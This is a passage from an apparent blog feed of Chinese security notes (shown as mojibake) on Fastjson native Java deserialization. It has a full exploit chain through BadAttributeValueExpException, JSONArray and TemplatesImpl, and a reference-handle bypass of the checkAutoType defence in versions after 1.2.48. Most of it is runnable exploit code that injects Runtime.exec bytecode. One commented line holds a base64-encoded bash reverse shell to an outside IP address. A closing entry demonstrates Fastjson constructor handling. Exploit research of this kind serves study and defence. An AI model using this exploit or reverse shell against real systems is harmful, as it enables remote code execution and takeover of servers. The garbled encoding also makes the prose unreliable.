<span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> BadAttributeValueExpException.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,jsonArray);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;./ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="type">byte</span>[] serialize = byteArrayOutputStream.toByteArray();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ªäººè¿˜æ˜¯æ¯”è¾ƒå–œæ¬¢è¿™æ¡é“¾å­ï¼Œä¹Ÿæ˜¯å±äºfjçš„çœŸåŸç”Ÿååºåˆ—åŒ–äº†</p><p>åˆ©ç”¨BadAttributeValueExpException#readObjctä¸­å¯¹äºreadObjectçš„è°ƒç”¨è°ƒç”¨fjä¸­çš„JSON#toString</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419150339444.png" alt="image-20240419150339444"></p><p>ç”±äºJSONä¸ºæŠ½è±¡ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰ç”¨ç»§æ‰¿ä»–çš„JSONArray</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419151012146.png" alt="image-20240419151012146"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419151000689.png" alt="image-20240419151000689"></p><p>åœ¨toJsonStringä¸­è°ƒç”¨ä¼ å…¥ç±»çš„getteræ–¹æ³•ï¼Œç»“åˆBadAttributeValueExpExceptionçš„tostringè°ƒç”¨ï¼Œå³å¯å°†é“¾å­è¿æ¥èµ·æ¥</p><h2 id="fj-1-2-48">fj&gt;1.2.48</h2><h3 id="WAFåˆ†æ">WAFåˆ†æ</h3><p>49ç‰ˆæœ¬å¯¹äºJSONArrayç±»è¿›è¡Œäº†readObjectç±»çš„é‡å†™ï¼Œåœ¨å…¶ä¸­è°ƒç”¨äº†resoleveClass</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419194302593.png" alt="image-20240419194302593"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419194333923.png" alt="image-20240419194333923"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419194249623.png" alt="image-20240419194249623"></p><p>åœ¨è¿™é‡Œè°ƒç”¨äº†checkAutoTypeå¯¹æ¶æ„ç±»è¿›è¡Œäº†wafï¼Œå¯¹fjäº†è§£çš„å¸ˆå‚…åº”è¯¥å¯¹è¿™ä¸ªå‡½æ•°å¹¶ä¸é™Œç”Ÿ</p><h3 id="ç»•è¿‡æ€è·¯">ç»•è¿‡æ€è·¯</h3><p>å¦‚ä½•ç»•è¿‡resoleveClassçš„æ£€æµ‹ï¼Ÿ</p><p>æˆ‘ä»¬æŸ¥çœ‹ObjectInputStream#readObject0çš„æºç </p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419220059491.png" alt="image-20240419220059491"></p><p>æˆ‘ä»¬çœ‹switchéƒ¨åˆ†ï¼Œä¸ä¼šè°ƒç”¨resoleveClassçš„å°±åªæœ‰TC_NULLã€TC_REFERENCEã€TC_LONGSTRINGã€TC_EXCEPTIONã€TC_STRINGè¿™å‡ ç§ï¼Œä½†æ˜¯å…¶ä¸­æœ‰ç”¨çš„å°±åªæœ‰referenceå¼•ç”¨ç±»å‹äº†</p><h3 id="ç»•è¿‡æ­¥éª¤">ç»•è¿‡æ­¥éª¤</h3><p>æµ‹è¯•demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(templates);</span><br><span class="line">        arrayList.add(templates);</span><br><span class="line">        serialize(arrayList);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ–­ç‚¹è¿è¡Œä¸€ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419220820005.png" alt="image-20240419220820005"></p><p>æˆ‘ä»¬è§‚å¯Ÿè°ƒç”¨æ ˆå’Œæ–­ç‚¹ä½ç½®ï¼Œè¿™é‡Œçš„elementDataå°±å­˜å‚¨çš„æˆ‘ä»¬ä¼ å…¥çš„ä¸¤ä¸ªtemplateså¯¹è±¡ï¼Œè·Ÿè¿›writeObjectï¼ˆObjectOutputStream#writeObjectï¼‰æ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419221015780.png" alt="image-20240419221015780"></p><p>å…¶è°ƒç”¨äº†writeObject0æ–¹æ³•ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419221057050.png" alt="image-20240419221057050"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419221416066.png" alt="image-20240419221416066"></p><p>å¯ä»¥å‘ç°åœ¨æ–­ç‚¹å¤„ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥çš„å¯¹è±¡æ˜¯å·²ç»å­˜åœ¨çš„ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨writeHandleå†™å…¥ï¼Œä¹Ÿå°±æ˜¯å¼•ç”¨å†™å…¥ï¼Œè¿™æ ·å°±å°†æˆ‘ä»¬çš„templatesä»¥referenceæ ¼å¼å†™äº†è¿›å»ï¼Œè¿›è€Œå®Œæˆäº†ç»•è¿‡</p><p>ç®€å•æ•´ç†ï¼š</p><p>åºåˆ—åŒ–æ—¶ï¼Œåœ¨è¿™é‡Œtemplateså…ˆåŠ å…¥åˆ°arrayListä¸­ï¼Œåé¢åœ¨JSONArrayä¸­å†æ¬¡åºåˆ—åŒ–TemplatesImplæ—¶ï¼Œç”±äºåœ¨<code>handles</code>è¿™ä¸ªhashè¡¨ä¸­æŸ¥åˆ°äº†æ˜ å°„ï¼Œåç»­åˆ™ä¼šä»¥å¼•ç”¨å½¢å¼è¾“å‡º</p><p>ååºåˆ—åŒ–æ—¶ArrayListå…ˆé€šè¿‡readObjectæ¢å¤TemplatesImplå¯¹è±¡ï¼Œä¹‹åæ¢å¤BadAttributeValueExpExceptionå¯¹è±¡ï¼Œåœ¨æ¢å¤è¿‡ç¨‹ä¸­ï¼Œç”±äºBadAttributeValueExpExceptionè¦æ¢å¤valå¯¹åº”çš„JSONArray/JSONObjectå¯¹è±¡ï¼Œä¼šè§¦å‘JSONArray/JSONObjectçš„readObjectæ–¹æ³•ï¼Œå°†è¿™ä¸ªè¿‡ç¨‹å§”æ‰˜ç»™<code>SecureObjectInputStream</code>ï¼Œåœ¨æ¢å¤JSONArray/JSONObjectä¸­çš„TemplatesImplå¯¹è±¡æ—¶ï¼Œç”±äºæ­¤æ—¶çš„ç¬¬äºŒä¸ªTemplatesImplå¯¹è±¡æ˜¯å¼•ç”¨ç±»å‹ï¼Œé€šè¿‡readHandleæ¢å¤å¯¹è±¡çš„é€”ä¸­ä¸ä¼šè§¦å‘resolveClassï¼Œç”±æ­¤å®ç°äº†ç»•è¿‡</p><p>å½“ç„¶å‰é¢ä¹Ÿæåˆ°äº†ä¸ä»…ä»…æ˜¯Listï¼ŒSetä¸Mapç±»å‹éƒ½èƒ½æˆåŠŸè§¦å‘å¼•ç”¨ç»•è¿‡ã€‚</p><h3 id="exp">exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestPayload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] genPayload(String cmd) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        clazz.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span></span><br><span class="line"><span class="comment">//        setValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;genPayload(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzI1MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)&#125;);</span></span><br><span class="line"><span class="comment">//        setValue(templates, &quot;_name&quot;, &quot;qiu&quot;);</span></span><br><span class="line"><span class="comment">//        setValue(templates, &quot;_tfactory&quot;, null);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ct</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\æ¼æ´å¤ç°\\fjyuansheng\\target\\classes\\shell.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ctDeclaredField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        ctDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ctDeclaredField.set(templates,bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Chu0&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setValue(bd, <span class="string">&quot;val&quot;</span>, jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(templates, bd);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;./ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="type">byte</span>[] serialize = byteArrayOutputStream.toByteArray();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize));</span><br><span class="line"><span class="comment">//                ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));</span></span><br><span class="line"><span class="comment">//        objectInputStream.readObject();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="java" scheme="https://bowuchuling.github.io/categories/java/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/java/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="java" scheme="https://bowuchuling.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>å…³äºFastJsonå¯¹æ„é€ å‡½æ•°çš„è°ƒç”¨ç ”ç©¶</title>
    <link href="https://bowuchuling.github.io/posts/188960jy.html"/>
    <id>https://bowuchuling.github.io/posts/188960jy.html</id>
    <published>2024-04-10T07:51:06.882Z</published>
    <updated>2024-04-10T09:31:58.688Z</updated>
    
    <content type="html"><![CDATA[<h1>å…³äºFastJsonå¯¹æ„é€ å‡½æ•°çš„è°ƒç”¨ç ”ç©¶</h1><h2 id="æ²¡æœ‰æ„é€ å‡½æ•°">æ²¡æœ‰æ„é€ å‡½æ•°</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.main.fastjsonconstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">noConstructor</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String student;</span><br><span class="line">    <span class="keyword">public</span> String id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(String id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getStudent</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStudent</span><span class="params">(String student)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.student = student;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, id=&#x27;&quot;</span> + id + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, student=&#x27;&quot;</span> + student + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;123\&quot;,\&quot;student\&quot;:\&quot;aaa\&quot;,\&quot;id\&quot;:\&quot;456\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">noConstructor</span> <span class="variable">no</span> <span class="operator">=</span> JSON.parseObject(payload, noConstructor.class);</span><br><span class="line">        System.out.println(no);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User<span class="punctuation">&#123;</span>name=&#x27;<span class="number">123</span>&#x27;<span class="punctuation">,</span> id=&#x27;<span class="number">456</span>&#x27;<span class="punctuation">,</span> student=&#x27;aaa&#x27;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å±äºfjæ¯”è¾ƒå¸¸è§çš„ä¸€ç§æƒ…å†µï¼Œç”±äºæ²¡æœ‰æ„é€ å‡½æ•°ï¼Œæ„é€ å‡½æ•°åœ¨ç¼–è¯‘æœŸé—´ç”±ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„ä¸€ä¸ªæ— å‚æ„é€ å‡½æ•°ï¼Œå†é€šè¿‡è°ƒç”¨å¯¹åº”jsoné”®å€¼çš„getter/setterå‡½æ•°è¿›è¡Œèµ‹å€¼ï¼Œå¦‚æœæœ‰æ— å‚æ„é€ å‡½æ•°çš„è¯ï¼Œå°±ä¼šç›´æ¥è°ƒç”¨æ— å‚æ„é€ 